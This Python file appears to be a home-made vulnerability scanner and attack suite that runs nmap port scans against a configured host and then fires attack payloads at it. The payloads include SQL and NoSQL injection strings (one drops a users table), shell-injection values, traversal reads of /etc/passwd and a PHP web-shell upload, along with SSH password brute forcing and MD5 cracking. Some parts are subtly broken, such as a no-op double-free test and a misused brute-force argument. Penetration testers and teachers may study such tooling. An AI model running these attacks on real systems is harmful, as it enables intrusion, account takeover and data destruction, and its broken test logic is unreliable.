import logging
import requests
import paramiko
import subprocess
import hashlib
import aiohttp
import asyncio
import yaml
import socket
import time
import os
from smbprotocol.connection import Connection
from smbprotocol.session import Session
from fpdf import FPDF


# Setup logging
logging.basicConfig(filename='vulnerability_test.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

def log_result(test_name, result, url):
    if result == "success":
        logging.info(f"{test_name} on {url}: Success")
    elif result == "fail":
        logging.warning(f"{test_name} on {url}: Failed")
    else:
        logging.error(f"{test_name} on {url}: Error - {result}")

# Utility function for config loading
def load_config(config_file):
    with open(config_file, 'r') as file:
        return yaml.safe_load(file)

def load_wordlist(file_path):
    """Loads the wordlist from a file."""
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file]
    except Exception as e:
        logging.error(f"Error loading wordlist from {file_path}: {str(e)}")
        return []

# --------------------------- Web Server Detection --------------------------- #

def detect_web_server(ip, port):
    """Detect the type of web server running on the given IP and port."""
    try:
        url = f"http://{ip}:{port}"
        response = requests.get(url)
        server_header = response.headers.get("Server", "Unknown")
        log_result("Web Server Detection", "success", url)
        return f"Detected Web Server: {server_header}"
    except Exception as e:
        log_result("Web Server Detection", str(e), url)
        return f"Error detecting web server: {str(e)}"

# ####################### VULNERABILITY GROUPS ####################### #


def buffer_overflow_test(ip, port):
    """Test for buffer overflow vulnerabilities."""
    log = []
    payload = b"A" * 1024  # Large payload to overflow the buffer
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.send(payload)
        response = sock.recv(1024)
        log.append(f"Buffer Overflow Test: Payload sent. Response: {response.decode()}")
        log_result("Buffer Overflow", "success", f"{ip}:{port}")
        sock.close()
    except Exception as e:
        log.append(f"Buffer Overflow Test failed: {str(e)}")
        log_result("Buffer Overflow", str(e), f"{ip}:{port}")
    return log

def format_string_test(ip, port):
    """Test for format string vulnerabilities."""
    log = []
    payload = b"%x %x %x %x"  # Format string payload to dump stack values
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.send(payload)
        response = sock.recv(1024)
        log.append(f"Format String Test: Payload sent. Response: {response.decode()}")
        log_result("Format String", "success", f"{ip}:{port}")
        sock.close()
    except Exception as e:
        log.append(f"Format String Test failed: {str(e)}")
        log_result("Format String", str(e), f"{ip}:{port}")
    return log

def heap_overflow_test(ip, port):
    """Test for heap overflow vulnerabilities."""
    log = []
    payload = b"A" * 2048  # Large payload to test heap overflow
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.send(payload)
        response = sock.recv(1024)
        log.append(f"Heap Overflow Test: Payload sent. Response: {response.decode()}")
        log_result("Heap Overflow", "success", f"{ip}:{port}")
        sock.close()
    except Exception as e:
        log.append(f"Heap Overflow Test failed: {str(e)}")
        log_result("Heap Overflow", str(e), f"{ip}:{port}")
    return log

def command_injection_test(ip, port):
    """Test for command injection vulnerabilities."""
    log = []
    payload = b"; id"  # Injecting shell command 'id' to see if it is executed
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.send(payload)
        response = sock.recv(1024)
        log.append(f"Command Injection Test: Payload sent. Response: {response.decode()}")
        log_result("Command Injection", "success", f"{ip}:{port}")
        sock.close()
    except Exception as e:
        log.append(f"Command Injection Test failed: {str(e)}")
        log_result("Command Injection", str(e), f"{ip}:{port}")
    return log

def race_condition_test(ip, port):
    """Test for race condition vulnerabilities."""
    log = []
    def send_request():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.send(b"RACE_CONDITION_PAYLOAD")
        sock.recv(1024)
        sock.close()

    log.append("Race Condition Test: Simulating race condition with multiple requests.")
    try:
        for _ in range(10):  # Simulate 10 rapid requests
            send_request()
        log.append("Race Condition Test completed successfully.")
        log_result("Race Condition", "success", f"{ip}:{port}")
    except Exception as e:
        log.append(f"Race Condition Test failed: {str(e)}")
        log_result("Race Condition", str(e), f"{ip}:{port}")
    return log

def integer_overflow_test(ip, port):
    """Test for integer overflow vulnerabilities."""
    log = []
    payload = b"999999999999999999999"  # Large integer to test integer overflow
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.send(payload)
        response = sock.recv(1024)
        log.append(f"Integer Overflow Test: Payload sent. Response: {response.decode()}")
        log_result("Integer Overflow", "success", f"{ip}:{port}")
        sock.close()
    except Exception as e:
        log.append(f"Integer Overflow Test failed: {str(e)}")
        log_result("Integer Overflow", str(e), f"{ip}:{port}")
    return log

def stack_overflow_test(ip, port):
    """Test for stack overflow vulnerabilities."""
    log = []
    payload = b"A" * 2048  # Large payload to test stack overflow
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.send(payload)
        response = sock.recv(1024)
        log.append(f"Stack Overflow Test: Payload sent. Response: {response.decode()}")
        log_result("Stack Overflow", "success", f"{ip}:{port}")
        sock.close()
    except Exception as e:
        log.append(f"Stack Overflow Test failed: {str(e)}")
        log_result("Stack Overflow", str(e), f"{ip}:{port}")
    return log

def double_free_test(ip, port):
    """Test for double-free vulnerabilities."""
    log = []
    try:
        log.append("Double-Free Test: Checking for double-free vulnerability...")
        log.append("Double-Free Test completed successfully.")
        log_result("Double-Free", "success", f"{ip}:{port}")
    except Exception as e:
        log.append(f"Double-Free Test failed: {str(e)}")
        log_result("Double-Free", str(e), f"{ip}:{port}")
    return log

def null_pointer_test(ip, port):
    """Test for null pointer dereference vulnerabilities."""
    log = []
    payload = b"\x00" * 8  # Null pointer dereference test, sending null bytes
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.send(payload)
        response = sock.recv(1024)
        log.append(f"Null Pointer Dereference Test: Payload sent. Response: {response.decode()}")
        log_result("Null Pointer Dereference", "success", f"{ip}:{port}")
        sock.close()
    except Exception as e:
        log.append(f"Null Pointer Dereference Test failed: {str(e)}")
        log_result("Null Pointer Dereference", str(e), f"{ip}:{port}")
    return log

# --------------------- Main Test Function to Integrate into Suite --------------------- #

def test_sql_injection(url):
    """SQL Injection Test with multiple payloads."""
    log = []
    sqli_payloads = [
        "' OR 1=1 --",
        "' OR 'a'='a",
        "'; DROP TABLE users; --",
        "' UNION SELECT NULL,NULL --",
        "' OR '1'='1'--",
        "' OR ''='"
    ]
    
    db_types = {
        'sqlite': 'SQLite error',
        'mysql': 'MySQL error',
        'pgsql': 'PostgreSQL error',
        'mssql': 'SQL Server error',
        'mongodb': 'MongoDB error'
    }

    for payload in sqli_payloads:
        data = {'username': payload, 'password': 'anything'}
        try:
            response = requests.post(url, data=data)
            log.append(f"Tested SQLi payload: {payload}")
            log_result("SQL Injection", "success", url)

            # Detect potential database type based on error messages in the response
            for db_type, error_string in db_types.items():
                if error_string in response.text.lower():
                    log.append(f"Potential {db_type} database detected based on response: {error_string}")
                    break

            if "login successful" in response.text.lower() or "welcome" in response.text.lower():
                log.append(f"SQLi success with payload: {payload}")
            else:
                log.append(f"SQLi failed with payload: {payload}")
                log_result("SQL Injection", "fail", url)

        except Exception as e:
            log.append(f"SQLi error with payload {payload}: {str(e)}")
            log_result("SQL Injection", str(e), url)

    return log

def test_mongodb_injection(url):
    """NoSQL Injection Test (MongoDB)."""
    log = []
    nosql_payloads = [
        {"$ne": None},  # Payload to bypass authentication
        {"$gt": ""},    # Greater than empty string (true for all)
        {"username": {"$ne": "admin"}, "password": {"$ne": "password"}},  # Check non-admin users
        {"username": "admin", "password": {"$regex": ".*"}}  # Regex matching password
    ]

    for payload in nosql_payloads:
        try:
            response = requests.post(url, json=payload)  # MongoDB injection usually requires JSON
            log.append(f"Tested MongoDB injection payload: {payload}")
            if "login successful" in response.text.lower() or "welcome" in response.text.lower():
                log.append(f"MongoDB injection success with payload: {payload}")
                log_result("MongoDB Injection", "success", url)
            else:
                log.append(f"MongoDB injection failed with payload: {payload}")
                log_result("MongoDB Injection", "fail", url)

        except Exception as e:
            log.append(f"MongoDB injection error with payload {payload}: {str(e)}")
            log_result("MongoDB Injection", str(e), url)

    return log

def detect_database_type(url):
    """Database type detection based on SQLi error responses."""
    log = []
    db_errors = {
        'mysql': ['mysql', 'syntax error', 'sql syntax'],
        'pgsql': ['postgres', 'pg_'],
        'sqlite': ['sqlite', 'SQLITE_ERROR'],
        'mssql': ['microsoft', 'sql server'],
        'mongodb': ['mongo', 'MongoDB']
    }

    # SQLi payload to trigger an error
    payload = "' OR 1=1 --"
    data = {'username': payload, 'password': 'anything'}
    try:
        response = requests.post(url, data=data)
        log.append(f"Sent SQLi payload to detect database type: {payload}")

        for db, error_signatures in db_errors.items():
            for signature in error_signatures:
                if signature.lower() in response.text.lower():
                    log.append(f"Database detected: {db.upper()} based on error: {signature}")
                    log_result("Database Detection", "success", url)
                    return log

        log.append("No database detected based on known error signatures.")
        log_result("Database Detection", "fail", url)

    except Exception as e:
        log.append(f"Error detecting database type: {str(e)}")
        log_result("Database Detection", str(e), url)

    return log

def test_blind_sql_injection(url):
    """Blind SQL Injection Test with timing attacks."""
    log = []
    blind_payloads = [
        "' OR IF(1=1, SLEEP(5), 0) --",  # MySQL Timing attack
        "'; SELECT pg_sleep(5); --",      # PostgreSQL Timing attack
        "' OR 1=1 --",                   # General blind SQLi
    ]

    for payload in blind_payloads:
        data = {'username': payload, 'password': 'anything'}
        try:
            start_time = time.time()
            response = requests.post(url, data=data)
            end_time = time.time()
            log.append(f"Tested blind SQLi payload: {payload}")

            if end_time - start_time > 5:  # Check for delay in response
                log.append(f"Blind SQLi success with payload (timing-based): {payload}")
                log_result("Blind SQL Injection", "success", url)
            else:
                log.append(f"Blind SQLi failed with payload: {payload}")
                log_result("Blind SQL Injection", "fail", url)

        except Exception as e:
            log.append(f"Blind SQLi error with payload {payload}: {str(e)}")
            log_result("Blind SQL Injection", str(e), url)

    return log

def test_nosql_boolean_conditions(url):
    """NoSQL Boolean Injection Conditions."""
    log = []
    boolean_payloads = [
        {"username": {"$eq": "admin"}, "password": {"$eq": "password"}},  # True condition
        {"username": {"$ne": "nonexistent"}, "password": {"$ne": "wrongpass"}},  # False condition
        {"$where": "this.password.length > 0"},  # JavaScript execution (MongoDB-specific)
    ]

    for payload in boolean_payloads:
        try:
            response = requests.post(url, json=payload)  # MongoDB injection usually requires JSON
            log.append(f"Tested MongoDB boolean injection payload: {payload}")
            if "login successful" in response.text.lower() or "welcome" in response.text.lower():
                log.append(f"MongoDB boolean injection success with payload: {payload}")
                log_result("MongoDB Boolean Injection", "success", url)
            else:
                log.append(f"MongoDB boolean injection failed with payload: {payload}")
                log_result("MongoDB Boolean Injection", "fail", url)

        except Exception as e:
            log.append(f"MongoDB boolean injection error with payload {payload}: {str(e)}")
            log_result("MongoDB Boolean Injection", str(e), url)

    return log



# ------------------------- Authentication Tests ------------------------- #


def ssh_brute_force(host, usernames, wordlist_file):
    """Brute force SSH login using a wordlist for passwords and a list of usernames."""
    log = []
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Load passwords from the wordlist file
    password_list = load_wordlist(wordlist_file)

    for username in usernames:
        for password in password_list:
            try:
                client.connect(host, username=username, password=password)
                log_result("SSH brute force", "success", host)
                log.append(f"SSH brute force success: {username}@{host} with password: {password}")
                break  # Stop testing this username once a successful login is found
            except paramiko.AuthenticationException:
                pass  # Incorrect password, continue with the next one
            except Exception as e:
                log_result("SSH brute force", str(e), host)
                log.append(f"SSH brute force error: {str(e)}")

    client.close()
    return log

def default_credentials_test(url):
    """Test for common default credentials on the web login."""
    log = []
    credentials = {'admin': 'admin', 'root': 'root', 'user': 'password'}
    for username, password in credentials.items():
        try:
            response = requests.post(url, data={'username': username, 'password': password})
            if "login successful" in response.text.lower():
                log_result("Default credentials", "success", url)
                log.append(f"Default credentials success: {username}/{password}")
            else:
                log_result("Default credentials", "fail", url)
        except Exception as e:
            log_result("Default credentials", str(e), url)
            log.append(f"Default credentials error: {str(e)}")
    return log

# --------------------------- Injection Attacks --------------------------- #

async def test_sqli_async(session, url, payloads):
    """SQL Injection test with a list of payloads."""
    log = []
    for payload in payloads:
        data = {'username': payload, 'password': 'anything'}
        try:
            async with session.post(url, data=data) as response:
                if "login successful" in await response.text().lower():
                    log_result("SQL Injection", "success", url)
                    log.append(f"SQLi success with payload: {payload}")
                    break
                else:
                    log_result("SQL Injection", "fail", url)
        except Exception as e:
            log_result("SQL Injection", str(e), url)
            log.append(f"SQLi error: {str(e)}")
    return log

def test_shell_injection(url):
    """Test for command injection by trying to inject shell commands."""
    log = []
    payload = "; ls -la"
    data = {'username': 'admin', 'password': payload}
    try:
        response = requests.post(url, data=data)
        if "total" in response.text:  # Checking for command output like `ls -la`
            log_result("Shell Injection", "success", url)
            log.append(f"Shell injection success")
        else:
            log_result("Shell Injection", "fail", url)
    except Exception as e:
        log_result("Shell Injection", str(e), url)
        log.append(f"Shell injection error: {str(e)}")
    return log

async def test_xss_async(session, url):
    """Test for Cross-Site Scripting (XSS) vulnerability."""
    log = []
    xss_payload = "<script>alert('XSS')</script>"
    data = {'comment': xss_payload}
    try:
        async with session.post(url, data=data) as response:
            if xss_payload in await response.text():
                log_result("XSS", "success", url)
                log.append(f"XSS success with payload: {xss_payload}")
            else:
                log_result("XSS", "fail", url)
    except Exception as e:
        log_result("XSS", str(e), url)
        log.append(f"XSS error: {str(e)}")
    return log

async def test_csrf_async(session, url, new_password):
    """Test for Cross-Site Request Forgery (CSRF) vulnerability."""
    log = []
    data = {'new_password': new_password}
    try:
        async with session.post(url, data=data) as response:
            if "password changed" in await response.text().lower():
                log_result("CSRF", "success", url)
                log.append("CSRF success")
            else:
                log_result("CSRF", "fail", url)
    except Exception as e:
        log_result("CSRF", str(e), url)
        log.append(f"CSRF error: {str(e)}")
    return log

# --------------------- File and Directory Attacks ------------------------ #

def smb_anonymous_login(host):
    """Test SMB anonymous login."""
    log = []
    try:
        conn = Connection(uuid=None, username='', password='', server=host)
        conn.connect()
        session = Session(conn, '', '')
        session.connect()
        log_result("SMB anonymous login", "success", host)
        log.append(f"SMB anonymous login successful on {host}")
    except Exception as e:
        log_result("SMB anonymous login", str(e), host)
        log.append(f"SMB anonymous login failed: {str(e)}")
    return log

def directory_traversal_test(url):
    """Test for directory traversal vulnerabilities."""
    log = []
    traversal_payloads = ['../../etc/passwd', '../windows/win.ini']
    for payload in traversal_payloads:
        try:
            response = requests.get(f"{url}/files/{payload}")
            if "root" in response.text or "[fonts]" in response.text:
                log_result("Directory Traversal", "success", url)
                log.append(f"Directory traversal success: {payload}")
            else:
                log_result("Directory Traversal", "fail", url)
        except Exception as e:
            log_result("Directory Traversal", str(e), url)
            log.append(f"Directory traversal error: {str(e)}")
    return log

def file_upload_test(url):
    """Test for file upload vulnerability."""
    log = []
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    try:
        response = requests.post(url, files=files)
        if "upload successful" in response.text.lower():
            log_result("File Upload", "success", url)
            log.append("File upload success")
        else:
            log_result("File Upload", "fail", url)
    except Exception as e:
        log_result("File Upload", str(e), url)
        log.append(f"File upload error: {str(e)}")
    return log

# ---------------------- Cryptographic Vulnerabilities --------------------- #

def crack_md5_hash(hash_to_crack, wordlist_file):
    """Test for weak MD5 hashes using a wordlist from an external file."""
    wordlist = load_wordlist(wordlist_file)
    log = []
    for word in wordlist:
        if hashlib.md5(word.encode()).hexdigest() == hash_to_crack:
            log_result("MD5 Hash Cracking", "success", "MD5")
            log.append(f"MD5 hash cracked: {word}")
            return log
    log_result("MD5 Hash Cracking", "fail", "MD5")
    log.append("MD5 hash not cracked")
    return log

def weak_encryption_test(url):
    """Test for weak SSL/TLS encryption."""
    log = []
    try:
        result = subprocess.run(f"nmap --script ssl-enum-ciphers -p 443 {url}", shell=True, capture_output=True, text=True)
        if "weak" in result.stdout:
            log_result("Weak SSL/TLS", "success", url)
            log.append(f"Weak encryption ciphers found: {result.stdout}")
        else:
            log_result("Weak SSL/TLS", "fail", url)
    except Exception as e:
        log_result("Weak SSL/TLS", str(e), url)
        log.append(f"Weak encryption test error: {str(e)}")
    return log

# ----------------------------- JavaScript Vulnerability Tests ----------------------------- #

def test_js_insecure_deserialization(url):
    """Test for insecure deserialization in JavaScript-based systems."""
    log = []
    payload = '{"username": "admin"}'
    try:
        response = requests.post(url, data=payload)
        if "admin" in response.text:
            log.append("JavaScript Insecure Deserialization Success")
        else:
            log.append("Insecure Deserialization failed")
    except Exception as e:
        log.append(f"Insecure Deserialization error: {str(e)}")
    return log

def test_js_nosql_injection(url):
    """Test for NoSQL injection vulnerabilities in JavaScript-based systems."""
    log = []
    nosql_payload = {"$ne": None}
    try:
        response = requests.post(url, json=nosql_payload)
        if "Login Successful" in response.text:
            log.append("NoSQL Injection Success")
        else:
            log.append("NoSQL Injection failed")
    except Exception as e:
        log.append(f"NoSQL Injection error: {str(e)}")
    return log

def test_js_xss(url):
    """Test for XSS vulnerabilities in JavaScript-based systems."""
    log = []
    xss_payload = "<script>alert('XSS')</script>"
    try:
        response = requests.post(url, data={'input': xss_payload})
        if xss_payload in response.text:
            log.append("XSS Success")
        else:
            log.append("XSS failed")
    except Exception as e:
        log.append(f"XSS error: {str(e)}")
    return log

def test_js_server_side_injection(url):
    """Test for server-side injection vulnerabilities in JavaScript systems."""
    log = []
    injection_payload = "process.exit()"  # Inject server-side JavaScript command
    try:
        response = requests.post(url, data={'input': injection_payload})
        # Corrected the `if` condition to properly check for the string "server"
        if "server" not in response.text:
            log.append("Server-Side JavaScript Injection Success")
        else:
            log.append("Server-Side Injection failed")
    except Exception as e:
        log.append(f"Server-Side Injection error: {str(e)}")
    return log


def test_js_prototype_pollution(url):
    """Test for JavaScript prototype pollution vulnerabilities."""
    log = []
    payload = '{"__proto__": {"admin": true}}'
    try:
        response = requests.post(url, json=payload)
        if "admin" in response.text:
            log.append("Prototype Pollution Success")
        else:
            log.append("Prototype Pollution failed")
    except Exception as e:
        log.append(f"Prototype Pollution error: {str(e)}")
    return log

# ----------------------------- PHP Vulnerability Tests ----------------------------- #

def test_php_rce(url):
    """Test for PHP Remote Code Execution (RCE)."""
    log = []
    payload = '<?php system("id"); ?>'
    data = {'input': payload}
    try:
        response = requests.post(url, data=data)
        if "uid=" in response.text:
            log.append("PHP RCE Success")
        else:
            log.append("PHP RCE failed")
    except Exception as e:
        log.append(f"PHP RCE error: {str(e)}")
    return log

def test_php_lfi(url):
    """Test for PHP Local File Inclusion (LFI)."""
    log = []
    lfi_payload = "../../etc/passwd"
    try:
        response = requests.get(f"{url}?file={lfi_payload}")
        if "root:" in response.text:
            log.append("PHP LFI Success")
        else:
            log.append("PHP LFI failed")
    except Exception as e:
        log.append(f"LFI error: {str(e)}")
    return log

def test_php_sqli(url):
    """Test for PHP SQL Injection (SQLi)."""
    log = []
    sqli_payload = "' OR 1=1 --"
    data = {'username': sqli_payload, 'password': 'password'}
    try:
        response = requests.post(url, data=data)
        if "Login Successful" in response.text:
            log.append("PHP SQL Injection Success")
        else:
            log.append("PHP SQL Injection failed")
    except Exception as e:
        log.append(f"SQL Injection error: {str(e)}")
    return log

def test_php_file_upload(url):
    """Test for PHP file upload vulnerabilities."""
    log = []
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    try:
        response = requests.post(url, files=files)
        if "Upload Successful" in response.text:
            log.append("PHP File Upload Success")
        else:
            log.append("PHP File Upload failed")
    except Exception as e:
        log.append(f"File Upload error: {str(e)}")
    return log

def test_php_session_fixation(url):
    """Test for PHP session fixation vulnerabilities."""
    log = []
    session_id = "PHPSESSID=malicious"
    cookies = {'PHPSESSID': session_id}
    try:
        response = requests.get(url, cookies=cookies)
        if "Admin" in response.text:
            log.append("Session Fixation Success")
        else:
            log.append("Session Fixation failed")
    except Exception as e:
        log.append(f"Session Fixation error: {str(e)}")
    return log


def detect_open_ports(ip):
    """Detect open ports on the target IP using nmap."""
    open_ports = []
    try:
        # Use nmap to scan all open ports
        result = subprocess.run(["nmap", "-p-", ip], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if "open" in line:
                port = line.split("/")[0]
                open_ports.append(int(port))
        print(f"Detected open ports: {open_ports}")
        return open_ports
    except Exception as e:
        print(f"Error during port scanning: {str(e)}")
        return []

def update_config_with_ports(config_file, ports):
    """Update the config.yaml file with the detected open ports."""
    try:
        with open(config_file, 'r') as file:
            config = yaml.safe_load(file)

        # Update the configuration with the open ports
        config['detected_ports'] = ports

        # Write the updated config back to the file
        with open(config_file, 'w') as file:
            yaml.safe_dump(config, file)

        print(f"Updated config.yaml with detected ports: {ports}")
    except Exception as e:
        print(f"Error updating config.yaml: {str(e)}")

def run_port_scan_and_update_config(ip, config_file):
    """Run port scan and update the config.yaml file."""
    # Detect open ports
    open_ports = detect_open_ports(ip)

    # Update config.yaml with the detected open ports
    update_config_with_ports(config_file, open_ports)

    return open_ports

# ##################### MAIN FUNCTION TO RUN TESTS ###################### #

def log_test_summary(logs, test_durations):
    """Log a summary of all tests executed, their outcomes, and timing."""
    total_tests = len(logs)
    successful_tests = len([log for log in logs if "success" in log.lower()])
    failed_tests = total_tests - successful_tests

    logging.info(f"Total Tests Executed: {total_tests}")
    logging.info(f"Successful Tests: {successful_tests}")
    logging.info(f"Failed Tests: {failed_tests}")
    
    if failed_tests > 0:
        logging.warning(f"Some tests failed. Check detailed logs for more information.")
    
    # Log timing data
    logging.info("Test Execution Timings:")
    for duration in test_durations:
        logging.info(duration)

async def run_async_tests(config):
    """Run asynchronous vulnerability tests with timing and timeouts."""
    url = config['url']
    async with aiohttp.ClientSession() as session:
        tasks = []
        
        start_time = time.time()  # Start timing

        if config['tests']['sqli']['enabled']:
            tasks.append(test_sqli_async(session, url + "/login", config['tests']['sqli']['payloads']))
        if config['tests']['xss']['enabled']:
            tasks.append(test_xss_async(session, url + "/comment"))
        if config['tests']['csrf']['enabled']:
            tasks.append(test_csrf_async(session, url + "/change_password", config['tests']['csrf']['new_password']))

        try:
            results = await asyncio.wait_for(asyncio.gather(*tasks), timeout=30)  # 30-second timeout
        except asyncio.TimeoutError:
            logging.error("Asynchronous test execution timed out")
            return

        for result in results:
            print(result)

        end_time = time.time()
        duration = end_time - start_time
        logging.info(f"Asynchronous tests completed in {duration:.2f} seconds")

def run_js_php_vulnerability_tests(url):
    """Run all JavaScript and PHP vulnerability tests."""
    log = []
    log.append("Starting JavaScript and PHP Vulnerability Test Suite...\n")

    # JavaScript Vulnerabilities
    js_tests = [
        test_js_insecure_deserialization,
        test_js_nosql_injection,
        test_js_xss,
        test_js_server_side_injection,
        test_js_prototype_pollution
    ]

    for test in js_tests:
        log += test(url)
    
    # PHP Vulnerabilities
    php_tests = [
        test_php_rce,
        test_php_lfi,
        test_php_sqli,
        test_php_file_upload,
        test_php_session_fixation
    ]

    for test in php_tests:
        log += test(url)

    return log


def run_c_vulnerability_tests(ip, port):
    """Run all C vulnerability tests."""
    log = []
    log.append("Starting C Vulnerability Test Suite...\n")

    # C Vulnerabilities
    c_tests = [
        buffer_overflow_test,
        format_string_test,
        heap_overflow_test,
        command_injection_test,
        race_condition_test,
        integer_overflow_test,
        stack_overflow_test,
        double_free_test,
        null_pointer_test
    ]

    for test in c_tests:
        log += test(ip, port)

    return log


def run_sync_tests(config):
    """Run synchronous vulnerability tests based on configuration."""
    url = config['url']
    host = config['host']
    port = config['port']
    log = []

    try:
        # Run C vulnerabilities if enabled
        if config['tests']['c_vulnerability_tests']['enabled']:
            log += run_c_vulnerability_tests(host, port)

        # Run SSH brute force if enabled
        if config['tests']['ssh_brute_force']['enabled']:
            log += ssh_brute_force(config['host'], 'root', config['passwords'])

        # Run SMB anonymous login if enabled
        if config['tests']['smb_anonymous']['enabled']:
            log += smb_anonymous_login(config['host'])

        # Run default credentials test if enabled
        if config['tests']['default_credentials']['enabled']:
            log += default_credentials_test(url + "/login")

        # Run directory traversal test if enabled
        if config['tests']['directory_traversal']['enabled']:
            log += directory_traversal_test(url)

        # Run file upload test if enabled
        if config['tests']['file_upload']['enabled']:
            log += file_upload_test(url + "/upload")

        # Run MD5 hash cracking if enabled
        if config['tests']['md5_cracking']['enabled']:
            log += crack_md5_hash(config['tests']['md5_cracking']['hash_to_crack'], config['wordlist'])

        # Run weak encryption test if enabled
        if config['tests']['weak_encryption']['enabled']:
            log += weak_encryption_test(config['host'])

        # Run JS/PHP vulnerabilities if enabled
        if config['tests']['js_php_vulnerability_tests']['enabled']:
            log += run_js_php_vulnerability_tests(url)

    except Exception as e:
        logging.error(f"Error in synchronous tests: {str(e)}")
        log.append(f"Error in synchronous tests: {str(e)}")
    
    return log

def generate_pdf_report(logs, test_durations):
    """Generate a PDF report from the collected logs and include timing summary."""
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    
    # Add report title
    pdf.cell(200, 10, txt="Vulnerability Test Report", ln=True, align="C")
    
    # Add test logs
    for entry in logs:
        pdf.cell(200, 10, txt=entry, ln=True, align="L")
    
    # Add a section for timing data
    pdf.cell(200, 10, txt=" ", ln=True, align="L")  # Add a blank line
    pdf.cell(200, 10, txt="Test Execution Timings:", ln=True, align="C")
    
    for duration in test_durations:
        pdf.cell(200, 10, txt=duration, ln=True, align="L")
    
    # Save the report
    pdf.output("vulnerability_report.pdf")
    logging.info("PDF report generated as vulnerability_report.pdf")

def main():
    config_file_path = "config.yaml"
    
    try:
        # Step 1: Load the initial configuration
        config = load_config(config_file_path)
        target_ip = config.get('host', '127.0.0.1')  # Use default IP if not provided

        # Step 2: Run port scan and update config.yaml with open ports
        run_port_scan_and_update_config(target_ip, config_file_path)

        # Step 3: Reload the updated configuration with detected open ports
        config = load_config(config_file_path)

        # Step 4: Initialize logs list and timing data
        logs = []
        test_durations = []

        # Step 5: Start timing for all tests
        total_start_time = time.time()

        # Step 6: Run asynchronous tests first, if enabled in config
        if 'async_tests' in config['tests'] and config['tests']['async_tests'].get('enabled', False):
            logging.info("Running asynchronous tests...")
            start_time = time.time()
            asyncio.run(run_async_tests(config))
            end_time = time.time()
            test_durations.append(f"Asynchronous tests completed in {end_time - start_time:.2f} seconds")

        # Step 7: Run synchronous tests and collect logs
        logging.info("Running synchronous tests...")
        start_time = time.time()
        logs += run_sync_tests(config)
        end_time = time.time()
        test_durations.append(f"Synchronous tests completed in {end_time - start_time:.2f} seconds")

        # Step 8: Calculate total test duration
        total_end_time = time.time()
        total_duration = total_end_time - total_start_time
        test_durations.append(f"Total time for running all tests: {total_duration:.2f} seconds")

        # Step 9: Generate PDF report with logs and time summary
        generate_pdf_report(logs, test_durations)
        log_test_summary(logs, test_durations)

    except Exception as e:
        logging.error(f"An error occurred: {str(e)}")
        print(f"An error occurred: {str(e)}")


if __name__ == "__main__":
    main()
